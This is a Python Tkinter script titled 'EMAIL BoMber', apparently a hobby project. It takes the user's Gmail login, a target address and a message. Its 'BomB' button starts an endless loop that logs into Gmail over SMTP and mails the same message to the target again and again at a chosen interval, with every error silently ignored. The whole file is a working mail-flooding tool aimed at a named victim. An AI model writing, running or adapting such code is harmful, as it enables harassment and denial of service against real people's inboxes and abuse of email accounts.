
import smtplib
import tkinter
import time

window = tkinter.Tk()
window.config(pady=30, padx=25, width=250, height=250,bg="black")
window.title("Email Sender")

title_label = tkinter.Label(text="!!EMAIL BoMber!!",fg="white",bg="black")
title_label.grid(row=0, column=2)
name_surname_label = tkinter.Label(text="Name/Surname: ",fg="white",bg="black")
name_surname_label.grid(row=1, column=0)
your_email = tkinter.Label(text="Your email addres:",fg="white",bg="black")
your_email.grid(row=2, column=0)
your_pasword = tkinter.Label(text="Password:",fg="white",bg="black")
your_pasword.grid(row=3, column=0)
time_to_sleep_label = tkinter.Label(text="Time between BoMbing in sec: ", fg="white", bg="black")
time_to_sleep_label.grid(row=5, column=1)
email_to_send_label = tkinter.Label(text="Target:",fg="white",bg="black")
email_to_send_label.grid(row=1, column=2)
your_mesage_label= tkinter.Label(text="Mesage:",fg="white",bg="black")
your_mesage_label.grid(row=2,column=2)

name_entry = tkinter.Entry()
name_entry.grid(row=1, column=1)
email_entry = tkinter.Entry()
email_entry.grid(row=2,column=1)
password_entry = tkinter.Entry(show="X")
password_entry.grid(row=3, column=1)
target_mail_entry= tkinter.Entry()
target_mail_entry.grid(row=1, column=3)
mesage_entry= tkinter.Entry()
mesage_entry.grid(row=2,column=3)
time_to_sleep_entry=tkinter.Entry()
time_to_sleep_entry.grid(row=5, column=2)

def emam():
    try:
        mesage_data = mesage_entry.get()
        my_email = email_entry.get()
        password = password_entry.get()
        target = target_mail_entry.get()
        connection = smtplib.SMTP("smtp.gmail.com")
        connection.starttls()
        connection.login(user=my_email, password=password)
        connection.sendmail(from_addr=my_email, to_addrs=target,msg=mesage_data)
        connection.close()
        mesage_entry.delete(0, "end")
        print(mesage_data)
    except:
        pass
def bomb():
    while True:
        try:
            timer = float(time_to_sleep_entry.get())
            time.sleep(timer)
            mesage_data = mesage_entry.get()
            my_email = email_entry.get()
            password = password_entry.get()
            target = target_mail_entry.get()
            connection = smtplib.SMTP("smtp.gmail.com")
            connection.starttls()
            connection.login(user=my_email, password=password)
            connection.sendmail(from_addr=my_email, to_addrs=target, msg=mesage_data)
            connection.close()
            mesage_entry.delete(0, "end")
            print("BoMbiNg!!!")
        except:
            pass
canvas = tkinter.Canvas()
canvas.config(width=250, height=100)
photo = tkinter.PhotoImage(file="images.png")
bo = canvas.create_image(125, 50, image=photo)

canvas.grid(row=5, column=0)


bombing = tkinter.Button(text="!!BomB!!",bg="black",fg="white", command=bomb)
bombing.grid(row=3,column=2)

send_mesage = tkinter.Button(text="!!!!!!!!!SeNd EmAiL!!!!!!!!",bg="black", command=emam,fg="white")
send_mesage.grid(row=3,column=3)


window.mainloop()
